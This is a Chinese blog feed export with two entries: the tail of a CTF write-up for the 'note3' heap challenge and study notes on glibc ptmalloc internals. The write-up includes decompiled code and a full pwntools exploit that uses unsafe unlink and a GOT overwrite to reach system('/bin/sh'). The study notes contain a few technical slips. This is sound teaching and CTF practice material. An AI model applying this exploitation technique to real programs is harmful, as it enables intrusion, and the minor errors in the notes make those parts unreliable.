class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// rax</span><br>  __int64 v1; <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input the id of the note:&quot;</span>);<br>  v0 = sub_4009B9();<br>  v3 = v0 % <span class="hljs-number">7</span>;<br>  <span class="hljs-keyword">if</span> ( v0 % <span class="hljs-number">7</span> &gt;= v0 )<br>  &#123;<br>    v1 = (__int64)*(&amp;ptr + v3);<br>    <span class="hljs-keyword">if</span> ( v1 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input the new content:&quot;</span>);<br>      sub_4008DD((__int64)*(&amp;ptr + v3), qword_6020C0[v3 + <span class="hljs-number">8</span>], <span class="hljs-number">10</span>);<br>      qword_6020C0[<span class="hljs-number">0</span>] = (__int64)*(&amp;ptr + v3);<br>      LODWORD(v1) = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Edit success&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    LODWORD(v1) = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input correct id.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> v1;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体的函数有漏洞</p><h4 id="sub-4008DD"><a href="#sub-4008DD" class="headerlink" title="sub_4008DD"></a>sub_4008DD</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_4008DD</span><span class="hljs-params">(__int64 ptr, __int64 len, <span class="hljs-type">char</span> a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [rsp+2Fh] [rbp-11h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 i; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span><br>  <span class="hljs-type">ssize_t</span> v7; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0LL</span>; len - <span class="hljs-number">1</span> &gt; i; ++i )<br>  &#123;<br>    v7 = read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1uLL</span>);<br>    <span class="hljs-keyword">if</span> ( v7 &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span> ( buf == a3 )<br>      <span class="hljs-keyword">break</span>;<br>    *(_BYTE *)(i + ptr) = buf;<br>  &#125;<br>  *(_BYTE *)(ptr + i) = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> i;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果 len 是 0 的话被当作 unsignedint 就会变成非常大，可以覆盖下面许多堆块的数据</p><p>还有一种是分配许多堆块，最后一个堆块堆块虽然会警告但是还是会分配，也就会覆盖第一个堆的 len ，也可以造成极大输入</p><h3 id="delete-2"><a href="#delete-2" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// rax</span><br>  __int64 v1; <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input the id of the note:&quot;</span>);<br>  v0 = sub_4009B9();<br>  v3 = v0 % <span class="hljs-number">7</span>;<br>  <span class="hljs-keyword">if</span> ( v0 % <span class="hljs-number">7</span> &gt;= v0 )<br>  &#123;<br>    v1 = (__int64)*(&amp;ptr + v3);<br>    <span class="hljs-keyword">if</span> ( v1 )<br>    &#123;<br>      <span class="hljs-built_in">free</span>(*(&amp;ptr + v3));<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">void</span> *)qword_6020C0[<span class="hljs-number">0</span>] == *(&amp;ptr + v3) )<br>        qword_6020C0[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>      *(&amp;ptr + v3) = <span class="hljs-number">0LL</span>;<br>      LODWORD(v1) = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Delete success&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    LODWORD(v1) = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input correct id.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> v1;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>方法跟上一题一一模一样，懒得写了</p><p>需要注意的是这里如果直接用 p64，也就是发送 8 字节，写入 got 表的话由于 edit内函数的问题，会将下一个 got 表地址最后一字节覆盖成 \x00，所以用p64(system_addr)[:7] 来只发送 7 个字节</p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./note3&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>r=process(<span class="hljs-string">&#x27;./note3&#x27;</span>) <br><span class="hljs-comment">#r=remote(&quot;node5.buuoj.cn&quot;,28982)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;ption---&gt;&gt;\n&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;an 1024)\n&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;ontent:\n&quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;ption---&gt;&gt;\n&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;the note:\n&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;content:\n&quot;</span>)<br>    r.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;ption---&gt;&gt;\n&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;the note:\n&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br>add(<span class="hljs-number">0x0</span>,<span class="hljs-string">b&#x27;?&#x27;</span>)   <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>pause()<br>bss=<span class="hljs-number">0x6020C0</span><br>chunk1_ptr=bss+<span class="hljs-number">0x10</span><br>fd=chunk1_ptr-<span class="hljs-number">0x18</span><br>bk=chunk1_ptr-<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x60</span>)+p64(fd)+p64(bk)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x60</span>)+p64(<span class="hljs-number">0x100</span>))<br>delete(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">2</span>+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x30\x07\x40\x00\x00\x00&#x27;</span>)<br><br>delete(<span class="hljs-number">1</span>)<br><br>puts_addr=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_addr-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br>libcbase=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">0</span>,p64(system_addr)[:<span class="hljs-number">7</span>])<br>delete(<span class="hljs-number">3</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>malloc源码学习</title>
    <link href="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="5-1边界标记法"><a href="#5-1边界标记法" class="headerlink" title="5.1边界标记法"></a>5.1边界标记法</h1><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739175742174.png" alt="1"></p><ul><li>size_t 32位下4字节，64位下4字节或8字节</li><li>分配chunk必须与2*SIZE_SZ(size_t)对齐</li><li>倒三倒四的#是用来处理chunk地址对齐的宏</li><li><strong>&#x3D;&#x3D;32平台下chunk地址按8字节对齐，64位按8字节或16字节对齐&#x3D;&#x3D;</strong></li></ul><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739175983933.png" alt="2"></p><p>使用结构体来描述这些chunk</p><ul><li>prev_size：前一个块是<strong>空闲时</strong>，表示前一个块大小，若不空闲则无意义</li><li>size：记录<strong>当前chunk大小和当前的和前一个chunk一些属性</strong>：是否在使用中、当前chunk是否是通过mmap分配，当前chunk是否属于主分配去</li><li>fd,bk：<strong>当前chunk空闲时</strong>存在的两个指针，用于链表管理，若已分配，则<strong>作为应用程序的使用空间</strong></li><li>fd_nextsize,bk_nextsize：当前chunk存在与large bins中时， fd_nextsize 指向下一个比当前 chunk 大小 &#x3D;&#x3D;大&#x3D;&#x3D;的第一个空闲 chunk，bk_nextszie 指向前一个比当前 chunk 大小&#x3D;&#x3D;小&#x3D;&#x3D;的第一个空闲 chunk ，<br>若已分配，则也作为<strong>程序的使用空间</strong><ul><li><strong>Fast Bins</strong>：用于管理小内存块（通常小于 64 字节），采用单链表结构，分配和释放速度较快。</li><li><strong>Small Bins</strong>：用于管理中等大小的内存块（通常小于 512 字节），采用双向链表结构。</li><li><strong>Large Bins</strong>：用于管理较大的内存块（通常大于 512 字节），采用双向链表结构，并按大小排序。</li><li><strong>Unsorted Bins</strong>：用于临时存放释放的内存块，后续会根据大小将其移动到 <code>small bins</code> 或 <code>large bins</code>。</li></ul></li></ul><p>已分配的</p><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739176396167.png" alt="3"></p><p>free中的</p><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739176416592.png" alt="4"></p><p>可以看到已分配中的fd和bk作为了程序可以使用的空间</p><ul><li>通过 <code>mmap</code> 分配的块，在它们的大小字段中设置了第二低的位 M（IS_MMAPPED）。因为它们是one by one分配的，所以每个块都必须包含自己的尾随大小字段，是独立于堆的。</li><li>P（PREV_INUSE）位存储在块大小的未使用的最低位中 ，标记前一个块是否被使用，1 使用，0 空闲。<strong>状态为0时</strong>，当前chunk包含前一个chunk大小及位置。第一个chunk总是被设置，防止访问错误</li><li>特殊块 <code>top</code> 不使用尾随大小字段，因为<strong>没有下一个连续块</strong>需要通过它来索引。在初始化后，<code>top</code> 始终存在。如果它变得小于 MINSIZE 字节长，它会被重新填充。</li></ul><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739178289931.png" alt="5"></p><ul><li>chunk2mem：通过chunk地址获得返回<strong>给用户</strong>内存地址（mem的地址）</li><li>mem2chunk：通过mem的地址<strong>得到chunk的地址</strong></li><li>mem地址同样2*SIZE_SZ对齐（前两个域刚好是2*SIZE_SZ大小）</li><li>宏 aligned_OK 和 misaligned_chunk(p)用于校验地址是否是按 2*SIZE_SZ 对齐的 </li><li>MIN_CHUNK_SIZE 定义了<strong>最小的</strong> chunk 的大小，<strong>32 位平台上位 16 字节，64 位平台为 24 字节或是 32 字节</strong> </li><li>MINSIZE是最小的分配的内存大小</li></ul><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739247145745.png" alt="6"></p><p>这几个宏将用户请求的大小转换为实际上需要分配的大小</p><ul><li><p>在linux X86_64平台中，假设SIZE_SZ为8字节，空闲时，一个chunk至少要有4<em>size_t空间（来存储prev_size,size,fd,bk）也就是*<em>MINSIZE（32B）</em></em></p></li><li><p>可以看到转换时不但考虑地址对齐，还<strong>额外加上了SIZE_SZ</strong>，原因：</p><p>对于一个使用中的chunk，其下一个chunk的pre_size处于无效的，可以被当前chunk所使用，所以<strong>in_use_size&#x3D;(用户请求大小 +16(pre_size+size)-8(借了下一个chunk的pre_size)) align to 16B</strong></p><p>又因为空闲时的chunk和使用中的chunk使用的是同一块空间，所以取最大者为实际分配的空间，所以最终chunk_size&#x3D;max(in_use_size,32(MINSIZE))</p></li><li><p>如果chunk由mmap直接分配，就不会有前一个和后一个chunk，所以借不到下一个chunk的pre_size，所以overhead&#x3D;2*SIZE_SZ</p></li></ul><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739264274475.png" alt="7"></p><p>chunk分割时总是以地址对齐（默认8字节，但也可以自己设置（alignment&#x3D;2^n,  n是整数且n&gt;&#x3D;3））所以chunk-&gt;size末3bit总是0，比如说8的二进制为1000，用来存储其他信息：</p><ul><li>第0位作为P状态位，记录前一chunk是否在使用中 1使用，0空闲</li><li>第1位M状态位，标记本chunk是否是mmap分配，1是0否</li><li>第2位A状态位，标记本chunk是否属于<strong>非主分配区</strong>，1是0否</li></ul><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739267841775.png" alt="8"></p><ul><li>pre_size记录的信息：<ul><li>前一个chunk空闲，pre_size记录前一个chunk的大小，这就是通过当前chunk指针获得前一个空闲chunk<strong>地址</strong>的依据，宏prev_chunk(p)就是这样实现的</li><li>前一个chunk在使用中。pre_size无意义</li></ul></li><li>size记录本chunk大小，可通过本chunk大小+本chunk地址得到下一个chunk的地址，由于size低三位记录控制信息，取出实际size在计算时需要注意。这是next_chunk(p)实现原理</li><li>chunksize(p)用于获得chunk实际大小，需要屏蔽size中控制信息</li><li>chunk_at_offset(p,s)将p+s地址强制看作一个chunk<ul><li>p是当前chunk地址</li><li>作用<ul><li>获取相邻chunk</li><li>合并空闲chunk</li><li>遍历堆内存</li></ul></li></ul></li><li>注意，可以有多个连续并且正在使用中的chunk，但不会有多个连续空闲chunk（会合并为一个大的空闲chunk）</li></ul><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739271421329.png" alt="8"></p><p>这组宏用于check&#x2F;set&#x2F;clear当前chunk<strong>使用</strong>标志位，<strong>因为当前chunk信息存储在下一个chunk中</strong>，所以要先获取下一个chunk地址再操作</p><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739271511827.png" alt="9"></p><p>这三个用于check&#x2F;set&#x2F;clear<strong>指定chunk</strong>的size中的使用表示位</p><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739272311840.png" alt="10"></p><ul><li><strong><code>set_head_size(p, s)</code></strong>  设置当前 chunk 的 <code>size</code> 域，并保留标志位 </li><li><strong><code>set_head(p, s)</code></strong>  设置当前 chunk 的 <code>size</code> 域，并忽略标志位 </li><li><strong><code>set_foot(p, s)</code></strong>  设置下一个 chunk 的 <code>prev_size</code> 为当前 chunk 的大小</li></ul><h1 id="5-2分箱式内存管理"><a href="#5-2分箱式内存管理" class="headerlink" title="5.2分箱式内存管理"></a>5.2分箱式内存管理</h1><p>对于空闲的chunk，ptmalloc采用分箱式内存管理方式，将其放在4个不同的bin中</p><ul><li>fast bins<ul><li>小内存块的高速缓存，<strong>小于64字节</strong>的chunk被回收时，首先放入fast bins中，分配小内存时，首先会查看fast bins中是否有合适的，若有则直接返回以加快分配速度</li></ul></li><li>unsorted bin<ul><li>顾名思义，类似一个<strong>中转</strong>。临时存放刚释放的chunk，后续会存到small&#x2F;large bins中。用户请求是首先看这个bin，找到直接返回，没找到再看small&#x2F;large bins</li></ul></li><li>small bins<ul><li>存放固定大小的chunk，共64个bin，最小的chunk大小为16或32字节，每个bin大小<strong>相差8&#x2F;16字节</strong>， Small Bins[0] 管理 32 字节的 chunk，Small Bins[1] 管理 48 字节的 chunk，以此类推</li></ul></li><li>large bins<ul><li>存放大小大于等于512或1024B的空闲chunk，采用<strong>双向链表</strong></li></ul></li></ul><h2 id="5-2-1-Small-Bins"><a href="#5-2-1-Small-Bins" class="headerlink" title="5.2.1 Small Bins"></a>5.2.1 Small Bins</h2><p> Chunk_size&#x3D;2 * SIZE_SZ * index</p><ul><li><p>在 SIZE_SZ 为 4B 的平台（<strong>32位</strong>平台）上，small bins 中的 chunk 大小是以 <strong>8B</strong> 为公差的等差数列，<strong>最大的chunk大小为 504B</strong>，<strong>最小的 chunk 大小为 16B</strong>，所以实际共 62 个 bin。分别为 16B、24B、 32B,…,504B。在 SIZE_SZ 为 8B 的平台（<strong>64位</strong>）上，small bins 中的 chunk 大小是以 <strong>16B</strong> 为公差 的等差数列，<strong>最大的 chunk 大小为 1008B，最小的 chunk 大小为 32B</strong>，所以实际共 62 个 bin。</p></li><li><p>ptmalloc维护了62个双向环形链表，每个链表的空闲chunk的大小一直</p></li><li><p>下图为32位平台下ptmalloc的组织方式</p><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739551424330.png" alt="分箱式管理"></p></li></ul><h2 id="5-2-2large-bins"><a href="#5-2-2large-bins" class="headerlink" title="5.2.2large bins"></a>5.2.2large bins</h2><ul><li><p>SIZE_SZ为4B（32位）平台下，&gt;&#x3D;512B，或SIZE_SZ为8B（64位），&gt;&#x3D;1024B的空闲chunk，由large bins管理。一共包含63个bin，每个bin中的chunk大小<strong>不是</strong>固定公差的等差数列，而是分成 6 组 bin，<strong>每组 bin 是一个固定公差的等差数列</strong>，每组的 bin <strong>数量依次为 32、16、8、4、2、1，公差依次为 64B、512B、 4096B、32768B、262144B</strong> 等 </p></li><li><p>比如SIZE_SZ为4的平台，第一个large bin起始chunk大小为512B，共32bin，公差64B，所以Chunk_size&#x3D;512+64*index</p><p>第二个large bin从第一个结束开始，所以Chunk_size&#x3D;512+64<em>32+512</em>index，后面以此类推</p></li><li><p>可以看出large bins和small bins都有规律，我们可以将这两个bins放在同一个包含1<strong>28个chunk的数组上</strong>，前一部分为small bins</p></li></ul><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739610043953.png"></p><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739610064636.png"></p><ul><li><p>这几个宏可以根据数组下标计算出该 bin 的 chunk <strong>大小（small bins）</strong>或是 chunk 大小<strong>范围（large bins）</strong>，也可以根据需要分配内存块大小计算出所需 chunk 所属 bin 的 index </p></li><li><p>bin_index(sz)根据所需内存大小计算出所需bin的index，再调用smallbin_index(sz)或者largebin_index(sz)</p></li><li><p>smallbin_index(sz)的计算：</p><ul><li>如果SIZE_SZ是4B，那么将sz&#x2F;4</li><li>如果SIZE_SZ是8B，那么将sz&#x2F;4</li></ul></li><li><p>large bins计算会复杂一点</p></li><li><p>在SIZE_SZ是4B的情况下，chunk大小和bin index：</p><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739639876879.png"></p></li></ul><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739639913107.png"></p><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739639928725.png"></p><ul><li>对于 SIZE_SZ 为 4B 的平台，bin[0]和 bin[1]是<strong>不存在</strong>的，因为最小的 chunk 为 <strong>16B</strong>（fd,bk,pre_size,size），small  bins 一共 <strong>62</strong> 个，large bins 一共 <strong>63</strong> 个，加起来一共 <strong>125</strong> 个 bin。而 NBINS 定义为 128，<strong>其实 bin[0]和 bin[127]都不存在</strong>，bin[1]为 unsorted bin 的 chunk 链表头。 </li><li>对于用户要分配的size，要先用,checked_request2size(req,sz)，计算出chunk大小再用bin_index(sz)计算出所属的bin_index</li></ul><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739689213477.png"></p><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739689225241.png"></p><ul><li>bin_at(m,i)通过bin index获得bin的链表头，chunk的fd，bk将空闲chunk链入链表，对于bin的链表头，只需要存储fd，bk即可，size和pre_size对链表来说无意义，所以为了节省空间和提高速度，<strong>每个bin只留了fd和bk的空间</strong></li><li>bin_at(m,i)：<strong>定义</strong>看出bin[0]不存在</li><li>在SIZE_SZ是4B的平台,bin[1]前4B存fd，后4B存bk，bin_at返回malloc_chunk的指针，由于fd在malloc_chunk的偏移地址是 offsetof (struct malloc_chunk, fd))&#x3D;8（前面有size和pre_size，加起来是8B），所以fd地址-8就是malloc_chunk的地址</li><li><strong>对 bin 的链表头的 chunk，一定不能修改 prev_size 和 size 域，这两个域是与其他 bin 的链表头的 fb 和 bk 内存复用的</strong> （其中存储的是fd和bk，若修改的话会破坏双向链表）</li><li>next_bin(b)用于获得下个bin地址：当前bin地址向后移动fd+bk的距离</li><li>bin的链表头的指针fd指向第一个chunk，bk指向最后一个，first(b)获取第一个可用chunk，last(b)获取最后一个可用chunk，这两个宏用于遍历bin</li><li>unlike(P,BK,FD)将chunk从空闲链表中取出来，注意large bins空闲chunk可能在<strong>两个双向链表</strong>中，unlike需要从两个中删除</li></ul><h2 id="5-2-3-Unsorted-bin"><a href="#5-2-3-Unsorted-bin" class="headerlink" title="5.2.3 Unsorted bin"></a>5.2.3 Unsorted bin</h2><ul><li><p>可看作small bins和large bins的cache（缓存），只有一个bin，以双向链表管理，不排序</p></li><li><p>所有chunk回收时首先放到该bin，如果该bin没合适的chunk，那么将该bin所有chunk加入到所属的bins中，然后再在small&#x2F;large bins分配合适的。bins数组中bin[1]用于存储unsorted bin的chunk链表头<br> <img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739699575792.png"></p></li></ul><p> <img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739699606500.png"></p><ul><li>第一个宏将bin[1]设置位unsorted bin的chunk链表头，对top chunk初始化，<strong>暂时</strong>将其初始化位unsorted chunk，这仅仅是初始化一个值，该chunk内容肯定不能用于top chunk来分配内存：<strong>top chunk不属于任何一个bin</strong>，但ptmalloc有些check需要topchunk属于一个bin</li></ul><h2 id="5-2-4fast-bins"><a href="#5-2-4fast-bins" class="headerlink" title="5.2.4fast bins"></a>5.2.4fast bins</h2><ul><li><p>该bins用于提高内存分配效率</p></li><li><p>对SIZE_SZ为4或8B平台，小于64或128B的请求首先查看该bins是否有合适的chunk存在（精准匹配），若存在则直接返回</p></li><li><p>可看作是small bins的前7部分的cache，SIZE_SZ为4&#x2F;8B，每个bin的chunk大小依次为16&#x2F;32，24&#x2F;48，…..</p></li><li><p>32为平台下分配的内存大小和chunk大小和fast bins对应关系如下</p><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739718475251.png"></p><p>fast bins可看作LIFO的栈（last in,first out）</p><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739718784433.png"></p></li><li><p>根据fast bin的index获取fast bin的地址</p><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739718820501.png"></p></li><li><p>fastbin_index(sz)用于获得fast bin在fast bins数组中的index  </p><ul><li>SIZE_SZ为4&#x2F;8，将sz除以8&#x2F;16后-2（bin[0],bin[1]不存在）</li></ul></li></ul><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739720061537.png"></p><ul><li>根据SIZE_SZ的不同大小，MAX_FAST_SIZE为80B或160B</li><li>NFASTBINS为10（fast bins的数组大小）</li><li>FASTBIN_CONSOLIDATION_THRESHOLD 用于检查，当释放的chunk与该chunk相邻chunk合并后大于64KB，认为内存碎片较多，需要将fast bins中所有chunk都合并，减少内存碎片对系统的影响</li></ul><p><img src="/2025/02/09/malloc%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/1739720458255.png"></p><ul><li>DEFAULT_MXFAST定义了默认fast bins中最大的chunk大小，SIZE_SZ为4&#x2F;8B，大小分别是64B&#x2F;128B</li><li>set_max_fast(s)将全局变量global_max_fast<strong>设置</strong>为DEAFAULT_MXFAST</li><li>get_max_fast()用于<strong>获得</strong>这个全局变量的值</li></ul><h1 id="5-3-核心结构体分析"><a href="#5-3-核心结构体分析" class="headerlink" title="5.3 核心结构体分析"></a>5.3 核心结构体分析</h1><p>ptmalloc使用malloc_state来管理分配区，参数管理用struct malloc_par</p><h2 